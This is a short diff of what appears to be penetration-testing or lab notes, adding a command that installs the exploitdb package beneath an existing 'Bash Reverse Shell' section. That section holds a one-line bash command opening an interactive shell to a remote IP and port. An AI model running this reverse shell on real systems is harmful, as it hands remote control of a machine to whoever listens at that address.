@@ -78,3 +78,6 @@ Bash Reverse Shell:
 ```
 bash -c 'bash -i >& /dev/tcp/192.168.45.5/1234 0>&1'
 ```
+```
+sudo apt install exploitdb -y
+```
